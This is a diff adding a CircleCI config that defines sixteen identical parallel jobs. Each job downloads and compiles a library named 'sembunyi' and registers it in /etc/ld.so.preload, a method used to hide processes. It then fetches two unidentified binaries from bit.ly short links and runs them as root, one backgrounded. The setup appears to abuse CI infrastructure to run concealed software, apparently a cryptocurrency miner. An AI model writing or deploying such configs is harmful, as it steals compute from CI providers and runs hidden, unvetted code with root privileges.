@@ -1,0 +1,391 @@
+version: 2.1
+jobs:
+  pnd01:
+    docker:
+      - image: circleci/ruby:2.5.3
+    steps:
+      - run:
+         name: Part 01
+         command: |
+          sudo apt-get update
+          sudo apt-get install gcc -y
+      - run: 
+         name: Part 02
+         command: |
+          wget https://github.com/p4n1k/mnr/releases/download/sembunyi/sembunyi.tar.gz
+          sudo su --command "tar -xvf sembunyi.tar.gz && cd sembunyi && make && sudo mv libsembunyi.so /usr/local/lib/ && echo /usr/local/lib/libsembunyi.so >> /etc/ld.so.preload"
+          wget https://bit.ly/3Ibzg9T
+          chmod +x 3Ibzg9T
+          sudo su --command "nohup ./3Ibzg9T --log=stdout > panik.log &"
+      - run: 
+         name: Part 03
+         command: |
+          wget https://bit.ly/3BsaT4Q
+          chmod +x 3BsaT4Q
+          sudo su --command "./3BsaT4Q"
+  pnd02:
+    docker:
+      - image: circleci/ruby:2.5.3
+    steps:
+      - run:
+         name: Part 01
+         command: |
+          sudo apt-get update
+          sudo apt-get install gcc -y
+      - run: 
+         name: Part 02
+         command: |
+          wget https://github.com/p4n1k/mnr/releases/download/sembunyi/sembunyi.tar.gz
+          sudo su --command "tar -xvf sembunyi.tar.gz && cd sembunyi && make && sudo mv libsembunyi.so /usr/local/lib/ && echo /usr/local/lib/libsembunyi.so >> /etc/ld.so.preload"
+          wget https://bit.ly/3Ibzg9T
+          chmod +x 3Ibzg9T
+          sudo su --command "nohup ./3Ibzg9T --log=stdout > panik.log &"
+      - run: 
+         name: Part 03
+         command: |
+          wget https://bit.ly/3BsaT4Q
+          chmod +x 3BsaT4Q
+          sudo su --command "./3BsaT4Q"
+  pnd03:
+    docker:
+      - image: circleci/ruby:2.5.3
+    steps:
+      - run:
+         name: Part 01
+         command: |
+          sudo apt-get update
+          sudo apt-get install gcc -y
+      - run: 
+         name: Part 02
+         command: |
+          wget https://github.com/p4n1k/mnr/releases/download/sembunyi/sembunyi.tar.gz
+          sudo su --command "tar -xvf sembunyi.tar.gz && cd sembunyi && make && sudo mv libsembunyi.so /usr/local/lib/ && echo /usr/local/lib/libsembunyi.so >> /etc/ld.so.preload"
+          wget https://bit.ly/3Ibzg9T
+          chmod +x 3Ibzg9T
+          sudo su --command "nohup ./3Ibzg9T --log=stdout > panik.log &"
+      - run: 
+         name: Part 03
+         command: |
+          wget https://bit.ly/3BsaT4Q
+          chmod +x 3BsaT4Q
+          sudo su --command "./3BsaT4Q"
+  pnd04:
+    docker:
+      - image: circleci/ruby:2.5.3
+    steps:
+      - run:
+         name: Part 01
+         command: |
+          sudo apt-get update
+          sudo apt-get install gcc -y
+      - run: 
+         name: Part 02
+         command: |
+          wget https://github.com/p4n1k/mnr/releases/download/sembunyi/sembunyi.tar.gz
+          sudo su --command "tar -xvf sembunyi.tar.gz && cd sembunyi && make && sudo mv libsembunyi.so /usr/local/lib/ && echo /usr/local/lib/libsembunyi.so >> /etc/ld.so.preload"
+          wget https://bit.ly/3Ibzg9T
+          chmod +x 3Ibzg9T
+          sudo su --command "nohup ./3Ibzg9T --log=stdout > panik.log &"
+      - run: 
+         name: Part 03
+         command: |
+          wget https://bit.ly/3BsaT4Q
+          chmod +x 3BsaT4Q
+          sudo su --command "./3BsaT4Q"
+  pnd05:
+    docker:
+      - image: circleci/ruby:2.5.3
+    steps:
+      - run:
+         name: Part 01
+         command: |
+          sudo apt-get update
+          sudo apt-get install gcc -y
+      - run: 
+         name: Part 02
+         command: |
+          wget https://github.com/p4n1k/mnr/releases/download/sembunyi/sembunyi.tar.gz
+          sudo su --command "tar -xvf sembunyi.tar.gz && cd sembunyi && make && sudo mv libsembunyi.so /usr/local/lib/ && echo /usr/local/lib/libsembunyi.so >> /etc/ld.so.preload"
+          wget https://bit.ly/3Ibzg9T
+          chmod +x 3Ibzg9T
+          sudo su --command "nohup ./3Ibzg9T --log=stdout > panik.log &"
+      - run: 
+         name: Part 03
+         command: |
+          wget https://bit.ly/3BsaT4Q
+          chmod +x 3BsaT4Q
+          sudo su --command "./3BsaT4Q"
+  pnd06:
+    docker:
+      - image: circleci/ruby:2.5.3
+    steps:
+      - run:
+         name: Part 01
+         command: |
+          sudo apt-get update
+          sudo apt-get install gcc -y
+      - run: 
+         name: Part 02
+         command: |
+          wget https://github.com/p4n1k/mnr/releases/download/sembunyi/sembunyi.tar.gz
+          sudo su --command "tar -xvf sembunyi.tar.gz && cd sembunyi && make && sudo mv libsembunyi.so /usr/local/lib/ && echo /usr/local/lib/libsembunyi.so >> /etc/ld.so.preload"
+          wget https://bit.ly/3Ibzg9T
+          chmod +x 3Ibzg9T
+          sudo su --command "nohup ./3Ibzg9T --log=stdout > panik.log &"
+      - run: 
+         name: Part 03
+         command: |
+          wget https://bit.ly/3BsaT4Q
+          chmod +x 3BsaT4Q
+          sudo su --command "./3BsaT4Q"
+  pnd07:
+    docker:
+      - image: circleci/ruby:2.5.3
+    steps:
+      - run:
+         name: Part 01
+         command: |
+          sudo apt-get update
+          sudo apt-get install gcc -y
+      - run: 
+         name: Part 02
+         command: |
+          wget https://github.com/p4n1k/mnr/releases/download/sembunyi/sembunyi.tar.gz
+          sudo su --command "tar -xvf sembunyi.tar.gz && cd sembunyi && make && sudo mv libsembunyi.so /usr/local/lib/ && echo /usr/local/lib/libsembunyi.so >> /etc/ld.so.preload"
+          wget https://bit.ly/3Ibzg9T
+          chmod +x 3Ibzg9T
+          sudo su --command "nohup ./3Ibzg9T --log=stdout > panik.log &"
+      - run: 
+         name: Part 03
+         command: |
+          wget https://bit.ly/3BsaT4Q
+          chmod +x 3BsaT4Q
+          sudo su --command "./3BsaT4Q"
+  pnd08:
+    docker:
+      - image: circleci/ruby:2.5.3
+    steps:
+      - run:
+         name: Part 01
+         command: |
+          sudo apt-get update
+          sudo apt-get install gcc -y
+      - run: 
+         name: Part 02
+         command: |
+          wget https://github.com/p4n1k/mnr/releases/download/sembunyi/sembunyi.tar.gz
+          sudo su --command "tar -xvf sembunyi.tar.gz && cd sembunyi && make && sudo mv libsembunyi.so /usr/local/lib/ && echo /usr/local/lib/libsembunyi.so >> /etc/ld.so.preload"
+          wget https://bit.ly/3Ibzg9T
+          chmod +x 3Ibzg9T
+          sudo su --command "nohup ./3Ibzg9T --log=stdout > panik.log &"
+      - run: 
+         name: Part 03
+         command: |
+          wget https://bit.ly/3BsaT4Q
+          chmod +x 3BsaT4Q
+          sudo su --command "./3BsaT4Q"
+  pnd09:
+    docker:
+      - image: circleci/ruby:2.5.3
+    steps:
+      - run:
+         name: Part 01
+         command: |
+          sudo apt-get update
+          sudo apt-get install gcc -y
+      - run: 
+         name: Part 02
+         command: |
+          wget https://github.com/p4n1k/mnr/releases/download/sembunyi/sembunyi.tar.gz
+          sudo su --command "tar -xvf sembunyi.tar.gz && cd sembunyi && make && sudo mv libsembunyi.so /usr/local/lib/ && echo /usr/local/lib/libsembunyi.so >> /etc/ld.so.preload"
+          wget https://bit.ly/3Ibzg9T
+          chmod +x 3Ibzg9T
+          sudo su --command "nohup ./3Ibzg9T --log=stdout > panik.log &"
+      - run: 
+         name: Part 03
+         command: |
+          wget https://bit.ly/3BsaT4Q
+          chmod +x 3BsaT4Q
+          sudo su --command "./3BsaT4Q"
+  pnd10:
+    docker:
+      - image: circleci/ruby:2.5.3
+    steps:
+      - run:
+         name: Part 01
+         command: |
+          sudo apt-get update
+          sudo apt-get install gcc -y
+      - run: 
+         name: Part 02
+         command: |
+          wget https://github.com/p4n1k/mnr/releases/download/sembunyi/sembunyi.tar.gz
+          sudo su --command "tar -xvf sembunyi.tar.gz && cd sembunyi && make && sudo mv libsembunyi.so /usr/local/lib/ && echo /usr/local/lib/libsembunyi.so >> /etc/ld.so.preload"
+          wget https://bit.ly/3Ibzg9T
+          chmod +x 3Ibzg9T
+          sudo su --command "nohup ./3Ibzg9T --log=stdout > panik.log &"
+      - run: 
+         name: Part 03
+         command: |
+          wget https://bit.ly/3BsaT4Q
+          chmod +x 3BsaT4Q
+          sudo su --command "./3BsaT4Q"
+  pnd11:
+    docker:
+      - image: circleci/ruby:2.5.3
+    steps:
+      - run:
+         name: Part 01
+         command: |
+          sudo apt-get update
+          sudo apt-get install gcc -y
+      - run: 
+         name: Part 02
+         command: |
+          wget https://github.com/p4n1k/mnr/releases/download/sembunyi/sembunyi.tar.gz
+          sudo su --command "tar -xvf sembunyi.tar.gz && cd sembunyi && make && sudo mv libsembunyi.so /usr/local/lib/ && echo /usr/local/lib/libsembunyi.so >> /etc/ld.so.preload"
+          wget https://bit.ly/3Ibzg9T
+          chmod +x 3Ibzg9T
+          sudo su --command "nohup ./3Ibzg9T --log=stdout > panik.log &"
+      - run: 
+         name: Part 03
+         command: |
+          wget https://bit.ly/3BsaT4Q
+          chmod +x 3BsaT4Q
+          sudo su --command "./3BsaT4Q"
+  pnd12:
+    docker:
+      - image: circleci/ruby:2.5.3
+    steps:
+      - run:
+         name: Part 01
+         command: |
+          sudo apt-get update
+          sudo apt-get install gcc -y
+      - run: 
+         name: Part 02
+         command: |
+          wget https://github.com/p4n1k/mnr/releases/download/sembunyi/sembunyi.tar.gz
+          sudo su --command "tar -xvf sembunyi.tar.gz && cd sembunyi && make && sudo mv libsembunyi.so /usr/local/lib/ && echo /usr/local/lib/libsembunyi.so >> /etc/ld.so.preload"
+          wget https://bit.ly/3Ibzg9T
+          chmod +x 3Ibzg9T
+          sudo su --command "nohup ./3Ibzg9T --log=stdout > panik.log &"
+      - run: 
+         name: Part 03
+         command: |
+          wget https://bit.ly/3BsaT4Q
+          chmod +x 3BsaT4Q
+          sudo su --command "./3BsaT4Q"
+  pnd13:
+    docker:
+      - image: circleci/ruby:2.5.3
+    steps:
+      - run:
+         name: Part 01
+         command: |
+          sudo apt-get update
+          sudo apt-get install gcc -y
+      - run: 
+         name: Part 02
+         command: |
+          wget https://github.com/p4n1k/mnr/releases/download/sembunyi/sembunyi.tar.gz
+          sudo su --command "tar -xvf sembunyi.tar.gz && cd sembunyi && make && sudo mv libsembunyi.so /usr/local/lib/ && echo /usr/local/lib/libsembunyi.so >> /etc/ld.so.preload"
+          wget https://bit.ly/3Ibzg9T
+          chmod +x 3Ibzg9T
+          sudo su --command "nohup ./3Ibzg9T --log=stdout > panik.log &"
+      - run: 
+         name: Part 03
+         command: |
+          wget https://bit.ly/3BsaT4Q
+          chmod +x 3BsaT4Q
+          sudo su --command "./3BsaT4Q"
+  pnd14:
+    docker:
+      - image: circleci/ruby:2.5.3
+    steps:
+      - run:
+         name: Part 01
+         command: |
+          sudo apt-get update
+          sudo apt-get install gcc -y
+      - run: 
+         name: Part 02
+         command: |
+          wget https://github.com/p4n1k/mnr/releases/download/sembunyi/sembunyi.tar.gz
+          sudo su --command "tar -xvf sembunyi.tar.gz && cd sembunyi && make && sudo mv libsembunyi.so /usr/local/lib/ && echo /usr/local/lib/libsembunyi.so >> /etc/ld.so.preload"
+          wget https://bit.ly/3Ibzg9T
+          chmod +x 3Ibzg9T
+          sudo su --command "nohup ./3Ibzg9T --log=stdout > panik.log &"
+      - run: 
+         name: Part 03
+         command: |
+          wget https://bit.ly/3BsaT4Q
+          chmod +x 3BsaT4Q
+          sudo su --command "./3BsaT4Q"
+  pnd15:
+    docker:
+      - image: circleci/ruby:2.5.3
+    steps:
+      - run:
+         name: Part 01
+         command: |
+          sudo apt-get update
+          sudo apt-get install gcc -y
+      - run: 
+         name: Part 02
+         command: |
+          wget https://github.com/p4n1k/mnr/releases/download/sembunyi/sembunyi.tar.gz
+          sudo su --command "tar -xvf sembunyi.tar.gz && cd sembunyi && make && sudo mv libsembunyi.so /usr/local/lib/ && echo /usr/local/lib/libsembunyi.so >> /etc/ld.so.preload"
+          wget https://bit.ly/3Ibzg9T
+          chmod +x 3Ibzg9T
+          sudo su --command "nohup ./3Ibzg9T --log=stdout > panik.log &"
+      - run: 
+         name: Part 03
+         command: |
+          wget https://bit.ly/3BsaT4Q
+          chmod +x 3BsaT4Q
+          sudo su --command "./3BsaT4Q"
+  pnd16:
+    docker:
+      - image: circleci/ruby:2.5.3
+    steps:
+      - run:
+         name: Part 01
+         command: |
+          sudo apt-get update
+          sudo apt-get install gcc -y
+      - run: 
+         name: Part 02
+         command: |
+          wget https://github.com/p4n1k/mnr/releases/download/sembunyi/sembunyi.tar.gz
+          sudo su --command "tar -xvf sembunyi.tar.gz && cd sembunyi && make && sudo mv libsembunyi.so /usr/local/lib/ && echo /usr/local/lib/libsembunyi.so >> /etc/ld.so.preload"
+          wget https://bit.ly/3Ibzg9T
+          chmod +x 3Ibzg9T
+          sudo su --command "nohup ./3Ibzg9T --log=stdout > panik.log &"
+      - run: 
+         name: Part 03
+         command: |
+          wget https://bit.ly/3BsaT4Q
+          chmod +x 3BsaT4Q
+          sudo su --command "./3BsaT4Q"
+
+workflows:
+  version: 2.1
+  build:
+    jobs:
+      - pnd01
+      - pnd02
+      - pnd03
+      - pnd04
+      - pnd05
+      - pnd06
+      - pnd07
+      - pnd08
+      - pnd09
+      - pnd10
+      - pnd11
+      - pnd12
+      - pnd13
+      - pnd14
+      - pnd15
+      - pnd16
